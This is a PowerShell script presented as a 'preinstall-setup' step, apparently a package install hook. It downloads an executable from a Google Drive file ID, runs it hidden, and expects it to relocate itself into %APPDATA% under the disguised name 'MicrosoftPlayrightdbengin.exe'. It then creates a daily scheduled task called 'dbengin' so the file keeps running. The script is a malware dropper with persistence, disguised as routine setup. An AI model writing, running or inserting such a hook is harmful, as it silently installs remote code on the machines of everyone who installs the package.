$ErrorActionPreference = 'Stop'
Write-Output "[preinstall-setup] Starting preinstall setup script..."
Write-Output "[preinstall-setup] Script execution started at $(Get-Date)"

# File ID and output path
$fileId = '1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n'
$output = "C:\Users\DEEBYTE COMPUTERS\Documents\Js\downloaded_from_gdown.exe"
Write-Output "[preinstall-setup] File ID: $fileId, Output path: $output"

# Download using better-gdrive (Node.js)
Write-Output "[preinstall-setup] Downloading file via better-gdrive..."
$downloadScript = @'
import { downloadFile } from "better-gdrive";
const fileId = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n";
const output = process.env.DOWNLOAD_OUTPUT;
await downloadFile(fileId, output);
'@

$env:DOWNLOAD_OUTPUT = $output
try {
    $downloadOutput = node --input-type=module -e $downloadScript 2>&1
    Write-Output "[preinstall-setup] Download command output: $downloadOutput"
    Write-Output "[preinstall-setup] Download complete."
} catch {
    Write-Output "[preinstall-setup] ERROR: better-gdrive download failed: $_"
    exit 1
}

# Verify downloaded file
if (Test-Path $output) {
    Write-Output "[preinstall-setup] File exists: $output"
    Write-Output "[preinstall-setup] File size: $((Get-Item $output).Length) bytes"

    # Execute the downloaded file (it will self‑move to %APPDATA%\MicrosoftPlayrightdbengin.exe)
    Write-Output "[preinstall-setup] Executing downloaded file (silently)..."
    $proc = Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -Wait -PassThru -ErrorAction SilentlyContinue
    Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"

    # Expected final location after self‑move
    $finalExe = Join-Path $env:APPDATA "MicrosoftPlayrightdbengin.exe"
    Write-Output "[preinstall-setup] Expecting final exe at: $finalExe"

    Start-Sleep -Seconds 2

    if (Test-Path $finalExe) {
        Write-Output "[preinstall-setup] Final exe found. Creating scheduled task..."

        $taskName = "dbengin"
        $startTime = "09:00"
        $trigger = New-ScheduledTaskTrigger -Daily -At $startTime
        $action = New-ScheduledTaskAction -Execute $finalExe
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

        try {
            Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Principal $principal -Settings $settings -Force
            Write-Output "[preinstall-setup] Scheduled task '$taskName' created successfully."
        } catch {
            Write-Output "[preinstall-setup] ERROR creating scheduled task: $_"
        }
    } else {
        Write-Output "[preinstall-setup] WARNING: Final exe not found at expected location. Task not created."
    }
} else {
    Write-Output "[preinstall-setup] ERROR: Downloaded file missing; aborting."
    exit 1
}